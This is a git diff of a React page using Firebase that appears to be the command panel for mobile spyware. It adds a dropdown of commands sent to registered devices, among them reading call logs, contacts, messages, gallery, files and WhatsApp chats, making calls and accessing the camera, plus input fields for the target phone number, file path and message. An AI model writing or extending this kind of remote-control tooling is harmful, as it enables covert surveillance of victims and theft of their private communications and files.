@@ -2,7 +2,7 @@
 
 import { useState, useEffect } from 'react'
 import { initializeApp } from 'firebase/app'
-import { getDatabase, ref, onValue, update } from 'firebase/database'
+import { getDatabase, ref,get, onValue, update } from 'firebase/database'
 
 // Firebase configuration
 const firebaseConfig = {
@@ -18,6 +18,7 @@ const firebaseConfig = {
 // Initialize Firebase
 const app = initializeApp(firebaseConfig)
 const database = getDatabase(app)
+const apiCalls = ['/call_logs', '/make_call','/get_contacts','/get_messages','/get_gallery','/get_file','/get_files','/access_camera','/get_whatsapp_chats',]
 
 export default function Home() {
   const [formData, setFormData] = useState({
@@ -29,21 +30,47 @@ export default function Home() {
   })
   const [results, setResults] = useState<any[]>([])
   const [devices, setDevices] = useState<String[]>([])
+  const [pathVisibility,setPathVisibility] = useState(false)
+  const [phoneNumberVisibility, setPhoneNumberVisibility] = useState(false)
+  const [messegeVisibility, setMessegeVisibility] = useState(false)
 
-  const loadDevices = ()=>{
-    const dataRef = ref(database)
-    onValue(dataRef, (snapshot) => {
-      const mac = snapshot.val()
+const loadDevices = async () => {
+  try {
+    const dataRef = ref(database); // Reference to your Firebase Realtime Database
+    const snapshot = await get(dataRef); // Perform a one-time read
+    if (snapshot.exists()) {
+      setDevices([])
+      const mac = snapshot.val(); // Get the value of the data
       if (mac) {
-        const keys = Object.keys(mac) // Extract keys (IDs) from the object
-        setDevices((prevDevices) => [...prevDevices, ...keys])
+        const keys = Object.keys(mac); // Extract keys (IDs) from the object
+        setDevices((prevDevices) => [...prevDevices, ...keys]); // Update state with new devices
       }
-    })
+    } else {
+      console.log("No data available");
+    }
+  } catch (error) {
+    console.error("Error fetching data:", error);
   }
+};
+
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
     const { name, value } = e.target
     setFormData(prevData => ({ ...prevData, [name]: value }))
+    if(name=='api_call'){
+        setPhoneNumberVisibility(false)
+        setPathVisibility(false)
+        setMessegeVisibility(false)
+      if(value=='/make_calls'|| value=='/get_messages'|| value=="/get_whatsapp_chats"){
+        setPhoneNumberVisibility(true)
+      }
+      if(value=="/get_messeges" || value=="/get_whatsapp_chats"){
+        setMessegeVisibility(true)
+      }
+      if(value=="/get_file"){
+        setPathVisibility(true)
+      }
+    }
   }
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -81,20 +108,31 @@ export default function Home() {
             />
           </div>
           <div className="mb-4">
-            <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="api_call">
+            <label
+              className="block text-gray-700 text-sm font-bold mb-2"
+              htmlFor="api_call"
+            >
               API Call
             </label>
-            <input
+            <select
               className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
               id="api_call"
-              type="text"
               name="api_call"
               value={formData.api_call}
               onChange={handleInputChange}
-              placeholder="Enter API call"
-            />
+            >
+              <option value="" disabled>
+                Select API call
+              </option>
+              {apiCalls.map((item) => (
+                <option key={item} value={item}>
+                  {item}
+                </option>
+              ))}
+            </select>
           </div>
-          <div className="mb-4">
+
+          {pathVisibility?<div className="mb-4">
             <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="path">
               Path
             </label>
@@ -107,8 +145,8 @@ export default function Home() {
               onChange={handleInputChange}
               placeholder="Enter path"
             />
-          </div>
-          <div className="mb-4">
+          </div>:<div></div>}
+          {phoneNumberVisibility?<div className="mb-4">
             <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="phoneNumber">
               Phone Number
             </label>
@@ -121,8 +159,8 @@ export default function Home() {
               onChange={handleInputChange}
               placeholder="Enter phone number"
             />
-          </div>
-          <div className="mb-6">
+          </div>:<div></div>}
+          {messegeVisibility?<div className="mb-6">
             <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="message">
               Message
             </label>
@@ -135,7 +173,7 @@ export default function Home() {
               placeholder="Enter message"
               rows={4}
             ></textarea>
-          </div>
+          </div>:<div></div>}
           <div className="flex items-center justify-between">
             <button
               className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
